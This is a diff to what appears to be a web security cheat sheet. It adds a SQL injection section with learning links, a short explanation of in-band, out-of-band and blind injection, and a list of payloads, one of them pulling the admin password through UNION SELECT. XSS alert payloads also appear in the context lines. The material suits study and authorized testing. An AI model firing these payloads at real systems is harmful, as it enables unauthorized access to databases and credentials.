@@ -48,7 +48,7 @@ A set of guidelines and best practices to help organizations build and improve t
 ### Cross-site Scripting (XSS)
 
 [OWASP XSS Overview](https://owasp.org/www-community/attacks/xss/)      
-[TryHackMe XSS Room](https://tryhackme.com/room/xssgi)
+[THM XSS Room](https://tryhackme.com/room/xssgi)
 
 ```
 <script>alert('XSS');</script>    
@@ -63,4 +63,24 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stY
 <iframe src="javascript:alert(`XSS`)">    
 ```
 
+### SQL Injection
+
+[OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)     
+[W3Schools SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)      
+[THM SQL Injection](https://tryhackme.com/room/sqlinjectionlm)      
+[OWASP Testing_PostgreSQL](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL)
+
+- Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.
+- Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).
+- Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.
+
+```
+;
+'
+' OR 1=1;--
+1 UNION SELECT 1,2
+%00' UNION SELECT password FROM Users WHERE username='admin'--
+%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--
+UNION ALL SELECT user,NULL,NULL--
+```
 
